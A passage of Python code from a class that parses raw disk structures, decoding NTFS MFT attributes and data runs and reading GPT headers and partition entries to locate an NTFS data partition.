            curr_sector[Offset_to_the_first_attribute:]
        )

        if "$FILE_NAME" in parsed_header.keys():
            filename_lenght = self.bytes_to_int_signed(
                parsed_header["$FILE_NAME"][0x58 : 0x58 + 1]
            )
            curr_MFA_sector.parent_record_number = self.bytes_to_int_unsigned(
                parsed_header["$FILE_NAME"][0x18 : 0x18 + 3] + b"\x00"
            )

            curr_MFA_sector.filename = parsed_header["$FILE_NAME"][
                0x58 + 2 : 0x58 + 2 + (filename_lenght * 2)
            ].decode("utf-16")
            self.context.log.debug(f"{curr_MFA_sector.filename=}")

        self.context.log.debug("Attribute 80")

        if "$DATA" in parsed_header.keys():
            dataRun_offset = self.bytes_to_int_signed(
                parsed_header["$DATA"][0x20 : 0x20 + 1]
            )

            dataRun = parsed_header["$DATA"][dataRun_offset:]
            curr_MFA_sector.dataRun, curr_MFA_sector.size = self.decode_dataRun(dataRun)

        self.context.log.debug(curr_MFA_sector)
        return curr_MFA_sector

    def analyze_gpt(self, disk_path):
        gpt_header = self.read_from_disk(self.GPT_HEADER_OFFSET, self.GPT_HEADER_SIZE)
        partition_entry_lba, num_partition_entries, partition_entry_size = (
            self.parse_gpt_header(gpt_header)
        )
        partition_entries = self.read_partition_entries(
            disk_path, partition_entry_lba, num_partition_entries, partition_entry_size
        )

        self.context.log.debug(f"Found {len(partition_entries)} partition entries.")

        NTFS_partition_location = -1
        for index, partition_entry in enumerate(partition_entries):
            self.context.log.debug(f"\nPartition {index + 1}:")
            first_lba, partition_name = self.parse_partition_entry(partition_entry)
            if first_lba > 0:
                self.context.log.debug(f"First Physical Address (LBA): {first_lba}")
            else:
                break

            self.context.log.debug(f"{partition_name=}")
            if partition_name == "Basic data partition":
                NTFS_partition_location = first_lba * 512
        return NTFS_partition_location

    def read_partition_entries(
        self,
        disk_path,
        partition_entry_lba,
        num_partition_entries,
        partition_entry_size,
    ):
        partition_entries = []
        partition_table_offset = partition_entry_lba * self.GPT_HEADER_OFFSET
        total_size = num_partition_entries * partition_entry_size

        partition_table_data = self.read_from_disk(partition_table_offset, total_size)

        for i in range(num_partition_entries):
            entry_offset = i * partition_entry_size
            partition_entry = partition_table_data[
                entry_offset : entry_offset + partition_entry_size
            ]
            partition_entries.append(partition_entry)

        return partition_entries

    def parse_gpt_header(self, gpt_header):
        header_format = "<8sIIIIQQQQ16sQIII"
        if len(gpt_header) < self.GPT_HEADER_SIZE:
            raise ValueError("GPT header data is too short")

        data = struct.unpack(header_format, gpt_header)

        partition_entry_lba = data[10]
        num_partition_entries = data[11]
        size_of_partition_entry = data[12]

        return partition_entry_lba, num_partition_entries, size_of_partition_entry

    def parse_partition_entry(self, partition_entry):
        entry_format = "<16s16sQQQ72s"

        (
            partition_type_guid,
            unique_partition_guid,
            first_lba,
            last_lba,
            attributes,
            partition_name,
        ) = struct.unpack(entry_format, partition_entry)

        partition_size = (last_lba - first_lba + 1) * self.SECTOR_SIZE

        partition_name = partition_name.decode("utf-16le").rstrip("\x00")

        return first_lba, partition_name
